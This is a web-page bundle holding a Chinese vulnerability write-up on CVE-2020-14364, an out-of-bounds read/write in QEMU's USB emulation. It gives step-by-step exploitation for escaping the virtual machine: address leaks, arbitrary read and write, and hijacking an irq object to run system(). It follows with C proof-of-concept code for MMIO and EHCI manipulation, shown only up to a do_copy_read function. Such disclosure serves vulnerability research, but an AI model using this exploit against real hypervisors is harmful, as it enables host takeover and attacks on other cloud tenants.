import{_ as p}from"./plugin-vue_export-helper-c27b6911.js";import{r as t,o as e,c as o,a as n,b as c,d as l,e as s}from"./app-58e4a7d6.js";const i={},u=s(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>当地时间8月24日，一个存在于QEMU USB模拟器中的越界读写漏洞（CVE-2020-14364）被公布。</p><p>漏洞位于 ./hw/usb/core.c 中，当程序处理来自客户机的USB数据包时，如果在 do_token_in 与 do_token_out中’USBDevice-&gt;setup_len’超过了USBDevice-&gt;data_buf[4096]，则存在问题。</p><p>客户机用户可能会使用此漏洞使QEMU进程崩溃，从而导致DoS或在宿主机上以QEMU进程的特权执行任意代码，实现虚拟机逃逸。</p><p>攻击者在拥有云环境虚拟机操作系统权限的情况下，便可利用该漏洞获取宿主机权限，进而攻击虚拟机所在资源池所有租户主机，甚至可通过已开通的内网权限攻击管理域系统，风险极高。</p><p>本次漏洞的影响范围较广，涉及qemu 1.0 以上的全部版本。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Qemu &gt; 1.0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>USB总线通过创建一个USBpacket对象来和USB设备通信。</p><p>Usbpacket对象中包含以下关键内容</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091236036.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>其中pid表明packet的类型，存在三种类型in、out、setup, ep指向endpoint对象，通过此结构定位目标usb设备。</p><p>数据交换为usbdevice中缓冲区的data_buf与usbpacket对象中使用usb_packet_map申请的缓冲区两者间通过usb_packet_copy函数实现,为了防止两者缓冲区长度不匹配，传送的长度由s-&gt;setup_len限制。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091236495.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>漏洞存在于s-&gt;setup_len赋值的过程do_token_setup中。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091237772.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>虽然进行了校验，但是由于在校验前，s-&gt;setup_len的值已经被设置导致之后的do_token_in或者do_token_out中使用usb_packet_copy时会产生越界读写漏洞。</p><ol><li>泄露USBdevice对象的地址。观察越界可读内容发现 可以从下方的ep_ctl-&gt;dev获取到usbdevice的对象地址。</li></ol><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091237295.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><ol start="2"><li><p>通过usbdevice的对象地址我们可以得到s-&gt;data_buf的位置，之后只需要覆盖下方的setup_index为目标地址-(s-&gt;data_buf)即可实现任意地址写。</p></li><li><p>我们还需要获取任何地址读取功能，setup_buf [0]控制写入方向，并且只能由do_token_setup进行修改。 由于我们在第二步中使用了越界写入功能，因此setup_buf [0]是写入方向，因此只可以进行写入操作，无法读取。绕过方法：设置setup_index = 0xfffffff8，再次越界，修改setup_buf [0]的值，然后再次将setup_index修改为要读取的地址，以实现任意地址读取。</p></li><li><p>通过任意地址读取usbdevice对象的内容以获取ehcistate对象地址，再次使用任意地址读取ehcistate对象的内容以获取ehci_bus_ops_companion地址。 该地址位于程序data节区。 这时，我们可以获得程序的加载地址和system @ plt地址。也可以通过读取usbdevice固定偏移位置后的usb-tablet对象来获得加载地址。</p></li><li><p>在data_buf中伪造irq结构。</p></li><li><p>以伪造结构劫持ehcistate中的irq对象。</p></li><li><p>通过mmio读取寄存器以触发ehci_update_irq，执行system（“ xcalc”）。 完成利用</p></li></ol>`,21),k={href:"https://v.qq.com/x/page/w3141fini4b.html",target:"_blank",rel:"noopener noreferrer"},r=s(`<h2 id="漏洞poc" tabindex="-1"><a class="header-anchor" href="#漏洞poc" aria-hidden="true">#</a> 漏洞POC</h2><div class="language-c line-numbers-mode" data-ext="c"><pre class="language-c"><code><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;inttypes.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/mman.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/io.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span> </span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span> </span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span> </span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;errno.h&gt;</span> </span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h&gt;</span> </span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/socket.h&gt;</span> </span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdbool.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;netinet/in.h&gt;</span> </span>

<span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span> mmio_mem<span class="token punctuation">;</span>
<span class="token keyword">char</span> <span class="token operator">*</span>dmabuf<span class="token punctuation">;</span>
<span class="token keyword">struct</span> <span class="token class-name">ohci_hcca</span> <span class="token operator">*</span> hcca<span class="token punctuation">;</span>
<span class="token keyword">struct</span> <span class="token class-name">EHCIqtd</span> <span class="token operator">*</span> qtd<span class="token punctuation">;</span>
<span class="token keyword">struct</span> <span class="token class-name">ohci_ed</span> <span class="token operator">*</span> ed<span class="token punctuation">;</span>
<span class="token keyword">struct</span> <span class="token class-name">ohci_td</span> <span class="token operator">*</span> td<span class="token punctuation">;</span>
<span class="token keyword">char</span> <span class="token operator">*</span>setup_buf<span class="token punctuation">;</span>
<span class="token class-name">uint32_t</span> <span class="token operator">*</span>dmabuf32<span class="token punctuation">;</span>
<span class="token keyword">char</span> <span class="token operator">*</span>td_addr<span class="token punctuation">;</span>
<span class="token keyword">struct</span> <span class="token class-name">EHCIqh</span> <span class="token operator">*</span> qh<span class="token punctuation">;</span>
<span class="token keyword">struct</span> <span class="token class-name">ohci_td</span> <span class="token operator">*</span> td_1<span class="token punctuation">;</span>
<span class="token keyword">char</span> <span class="token operator">*</span>dmabuf_phys_addr<span class="token punctuation">;</span>
<span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">USBDevice</span> USBDevice<span class="token punctuation">;</span>
<span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">USBEndpoint</span> USBEndpoint<span class="token punctuation">;</span>

<span class="token keyword">struct</span> <span class="token class-name">USBEndpoint</span> <span class="token punctuation">{</span>
    <span class="token class-name">uint8_t</span> nr<span class="token punctuation">;</span>
    <span class="token class-name">uint8_t</span> pid<span class="token punctuation">;</span>
    <span class="token class-name">uint8_t</span> type<span class="token punctuation">;</span>
    <span class="token class-name">uint8_t</span> ifnum<span class="token punctuation">;</span>
    <span class="token keyword">int</span> max_packet_size<span class="token punctuation">;</span>
    <span class="token keyword">int</span> max_streams<span class="token punctuation">;</span>
    bool pipeline<span class="token punctuation">;</span>
    bool halted<span class="token punctuation">;</span>
    USBDevice <span class="token operator">*</span>dev<span class="token punctuation">;</span>
    USBEndpoint <span class="token operator">*</span>fd<span class="token punctuation">;</span>
    USBEndpoint <span class="token operator">*</span>bk<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">struct</span> <span class="token class-name">USBDevice</span> <span class="token punctuation">{</span>
    <span class="token class-name">int32_t</span> remote_wakeup<span class="token punctuation">;</span>
    <span class="token class-name">int32_t</span> setup_state<span class="token punctuation">;</span>
    <span class="token class-name">int32_t</span> setup_len<span class="token punctuation">;</span>
    <span class="token class-name">int32_t</span> setup_index<span class="token punctuation">;</span>
    USBEndpoint ep_ctl<span class="token punctuation">;</span>
    USBEndpoint ep_in<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    USBEndpoint ep_out<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>


<span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">EHCIqh</span> <span class="token punctuation">{</span>
    <span class="token class-name">uint32_t</span> next<span class="token punctuation">;</span>                    <span class="token comment">/* Standard next link pointer */</span>
    <span class="token comment">/* endpoint characteristics */</span>
    <span class="token class-name">uint32_t</span> epchar<span class="token punctuation">;</span>
    <span class="token comment">/* endpoint capabilities */</span>
    <span class="token class-name">uint32_t</span> epcap<span class="token punctuation">;</span>
    <span class="token class-name">uint32_t</span> current_qtd<span class="token punctuation">;</span>             <span class="token comment">/* Standard next link pointer */</span>
    <span class="token class-name">uint32_t</span> next_qtd<span class="token punctuation">;</span>                <span class="token comment">/* Standard next link pointer */</span>
    <span class="token class-name">uint32_t</span> altnext_qtd<span class="token punctuation">;</span>
    <span class="token class-name">uint32_t</span> token<span class="token punctuation">;</span>                   <span class="token comment">/* Same as QTD token */</span>
    <span class="token class-name">uint32_t</span> bufptr<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>               <span class="token comment">/* Standard buffer pointer */</span>
<span class="token punctuation">}</span> EHCIqh<span class="token punctuation">;</span>

<span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">EHCIqtd</span> <span class="token punctuation">{</span>
    <span class="token class-name">uint32_t</span> next<span class="token punctuation">;</span>                    <span class="token comment">/* Standard next link pointer */</span>
    <span class="token class-name">uint32_t</span> altnext<span class="token punctuation">;</span>                 <span class="token comment">/* Standard next link pointer */</span>
    <span class="token class-name">uint32_t</span> token<span class="token punctuation">;</span>
    <span class="token class-name">uint32_t</span> bufptr<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>               <span class="token comment">/* Standard buffer pointer */</span>
<span class="token punctuation">}</span> EHCIqtd<span class="token punctuation">;</span>

<span class="token class-name">uint64_t</span> <span class="token function">virt2phys</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span> p<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token class-name">uint64_t</span> virt <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span>p<span class="token punctuation">;</span>
    <span class="token comment">// Assert page alignment</span>
    <span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">&quot;/proc/self/pagemap&quot;</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>fd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">&quot;open&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">uint64_t</span> offset <span class="token operator">=</span> <span class="token punctuation">(</span>virt <span class="token operator">/</span> <span class="token number">0x1000</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">;</span>
    <span class="token function">lseek</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> offset<span class="token punctuation">,</span> <span class="token constant">SEEK_SET</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">uint64_t</span> phys<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>phys<span class="token punctuation">,</span> <span class="token number">8</span> <span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">8</span><span class="token punctuation">)</span>
        <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">&quot;read&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// Assert page present</span>

    phys <span class="token operator">=</span> <span class="token punctuation">(</span>phys <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1ULL</span> <span class="token operator">&lt;&lt;</span> <span class="token number">54</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">0x1000</span><span class="token operator">+</span><span class="token punctuation">(</span>virt<span class="token operator">&amp;</span><span class="token number">0xfff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> phys<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

 

<span class="token keyword">void</span> <span class="token function">die</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> msg<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">perror</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

 
<span class="token keyword">void</span> <span class="token function">mmio_write</span><span class="token punctuation">(</span><span class="token class-name">uint32_t</span> addr<span class="token punctuation">,</span> <span class="token class-name">uint32_t</span> value<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>mmio_mem <span class="token operator">+</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

 

<span class="token class-name">uint64_t</span> <span class="token function">mmio_read</span><span class="token punctuation">(</span><span class="token class-name">uint32_t</span> addr<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>mmio_mem <span class="token operator">+</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
<span class="token keyword">int</span> mmio_fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">&quot;/sys/devices/pci0000:00/0000:00:05.7/resource0&quot;</span><span class="token punctuation">,</span> O_RDWR <span class="token operator">|</span> O_SYNC<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>mmio_fd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">&quot;mmio_fd open failed&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

mmio_mem <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">,</span> PROT_READ <span class="token operator">|</span> PROT_WRITE<span class="token punctuation">,</span> MAP_SHARED<span class="token punctuation">,</span> mmio_fd<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>mmio_mem <span class="token operator">==</span> MAP_FAILED<span class="token punctuation">)</span>
        <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">&quot;mmap mmio_mem failed&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

dmabuf <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x3000</span><span class="token punctuation">,</span> PROT_READ <span class="token operator">|</span> PROT_WRITE<span class="token punctuation">,</span> MAP_SHARED <span class="token operator">|</span> MAP_ANONYMOUS<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>dmabuf <span class="token operator">==</span> MAP_FAILED<span class="token punctuation">)</span>
        <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">&quot;mmap&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">mlock</span><span class="token punctuation">(</span>dmabuf<span class="token punctuation">,</span> <span class="token number">0x3000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
hcca<span class="token operator">=</span>dmabuf<span class="token punctuation">;</span>
dmabuf32<span class="token operator">=</span>dmabuf<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">;</span>
qtd<span class="token operator">=</span>dmabuf<span class="token operator">+</span><span class="token number">0x200</span><span class="token punctuation">;</span>
qh<span class="token operator">=</span>dmabuf<span class="token operator">+</span><span class="token number">0x100</span><span class="token punctuation">;</span>
setup_buf<span class="token operator">=</span>dmabuf<span class="token operator">+</span><span class="token number">0x300</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">void</span> <span class="token function">init_state</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
<span class="token function">mmio_write</span><span class="token punctuation">(</span><span class="token number">0x64</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">mmio_write</span><span class="token punctuation">(</span><span class="token number">0x64</span><span class="token punctuation">,</span><span class="token number">0x4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
qh<span class="token operator">-&gt;</span>epchar<span class="token operator">=</span><span class="token number">0x00</span><span class="token punctuation">;</span>
qh<span class="token operator">-&gt;</span>token<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&lt;&lt;</span><span class="token number">7</span><span class="token punctuation">;</span>
qh<span class="token operator">-&gt;</span>current_qtd<span class="token operator">=</span><span class="token function">virt2phys</span><span class="token punctuation">(</span>dmabuf<span class="token operator">+</span><span class="token number">0x200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">struct</span> <span class="token class-name">EHCIqtd</span> <span class="token operator">*</span> qtd<span class="token punctuation">;</span>
qtd<span class="token operator">=</span>dmabuf<span class="token operator">+</span><span class="token number">0x200</span><span class="token punctuation">;</span>
qtd<span class="token operator">-&gt;</span>token<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&lt;&lt;</span><span class="token number">7</span> <span class="token operator">|</span> <span class="token number">2</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span> <span class="token operator">|</span> <span class="token number">8</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">;</span>
qtd<span class="token operator">-&gt;</span>bufptr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">virt2phys</span><span class="token punctuation">(</span>dmabuf<span class="token operator">+</span><span class="token number">0x300</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
setup_buf<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0xff</span><span class="token punctuation">;</span>
setup_buf<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0x0</span><span class="token punctuation">;</span>
dmabuf32<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">virt2phys</span><span class="token punctuation">(</span>dmabuf<span class="token operator">+</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">0x2</span><span class="token punctuation">;</span>
<span class="token function">mmio_write</span><span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">mmio_write</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">mmio_write</span><span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span><span class="token function">virt2phys</span><span class="token punctuation">(</span>dmabuf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">mmio_write</span><span class="token punctuation">(</span><span class="token number">0x34</span><span class="token punctuation">,</span><span class="token function">virt2phys</span><span class="token punctuation">(</span>dmabuf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">mmio_write</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0x11</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">void</span> <span class="token function">set_length</span><span class="token punctuation">(</span><span class="token class-name">uint16_t</span> len<span class="token punctuation">,</span><span class="token class-name">uint8_t</span> in<span class="token punctuation">)</span><span class="token punctuation">{</span>
<span class="token function">mmio_write</span><span class="token punctuation">(</span><span class="token number">0x64</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">mmio_write</span><span class="token punctuation">(</span><span class="token number">0x64</span><span class="token punctuation">,</span><span class="token number">0x4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
setup_buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>in<span class="token punctuation">;</span>
setup_buf<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">=</span>len<span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">;</span>
setup_buf<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span>len<span class="token operator">&gt;&gt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">;</span>
qh<span class="token operator">-&gt;</span>epchar<span class="token operator">=</span><span class="token number">0x00</span><span class="token punctuation">;</span>
qh<span class="token operator">-&gt;</span>token<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&lt;&lt;</span><span class="token number">7</span><span class="token punctuation">;</span>
qh<span class="token operator">-&gt;</span>current_qtd<span class="token operator">=</span><span class="token function">virt2phys</span><span class="token punctuation">(</span>dmabuf<span class="token operator">+</span><span class="token number">0x200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

qtd<span class="token operator">-&gt;</span>token<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&lt;&lt;</span><span class="token number">7</span> <span class="token operator">|</span> <span class="token number">2</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span> <span class="token operator">|</span> <span class="token number">8</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">;</span>
qtd<span class="token operator">-&gt;</span>bufptr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">virt2phys</span><span class="token punctuation">(</span>dmabuf<span class="token operator">+</span><span class="token number">0x300</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
dmabuf32<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">virt2phys</span><span class="token punctuation">(</span>dmabuf<span class="token operator">+</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">0x2</span><span class="token punctuation">;</span>
<span class="token function">mmio_write</span><span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">mmio_write</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">mmio_write</span><span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span><span class="token function">virt2phys</span><span class="token punctuation">(</span>dmabuf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">mmio_write</span><span class="token punctuation">(</span><span class="token number">0x34</span><span class="token punctuation">,</span><span class="token function">virt2phys</span><span class="token punctuation">(</span>dmabuf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">mmio_write</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0x11</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">void</span> <span class="token function">do_copy_read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
<span class="token function">mmio_write</span><span class="token punctuation">(</span><span class="token number">0x64</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">mmio_write</span><span class="token punctuation">(</span><span class="token number">0x64</span><span class="token punctuation">,</span><span class="token number">0x4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

qh<span class="token operator">-&gt;</span>epchar<span class="token operator">=</span><span class="token number">0x00</span><span class="token punctuation">;</span>
qh<span class="token operator">-&gt;</span>token<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&lt;&lt;</span><span class="token number">7</span><span class="token punctuation">;</span>
qh<span class="token operator">-&gt;</span>current_qtd<span class="token operator">=</span><span class="token function">virt2phys</span><span class="token punctuation">(</span>dmabuf<span class="token operator">+</span><span class="token number">0x200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
qtd<span class="token operator">-&gt;</span>token<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&lt;&lt;</span><span class="token number">7</span> <span class="token operator">|</span> <span class="token number">1</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span> <span class="token operator">|</span> <span class="token number">0x1f00</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">;</span>
qtd<span class="token operator">-&gt;</span>bufptr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">virt2phys</span><span class="token punctuation">(</span>dmabuf<span class="token operator">+</span><span class="token number">0x1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
qtd<span class="token operator">-&gt;</span>bufptr<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">virt2phys</span><span class="token punctuation">(</span>dmabuf<span class="token operator">+</span><span class="token number">0x2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
dmabuf32<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">virt2phys</span><span class="token punctuation">(</span>dmabuf<span class="token operator">+</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">0x2</span><span class="token punctuation">;</span>
<span class="token function">mmio_write</span><span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">mmio_write</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">mmio_write</span><span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span><span class="token function">virt2phys</span><span class="token punctuation">(</span>dmabuf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">mmio_write</span><span class="token punctuation">(</span><span class="token number">0x34</span><span class="token punctuation">,</span><span class="token function">virt2phys</span><span class="token punctuation">(</span>dmabuf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">mmio_write</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0x11</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

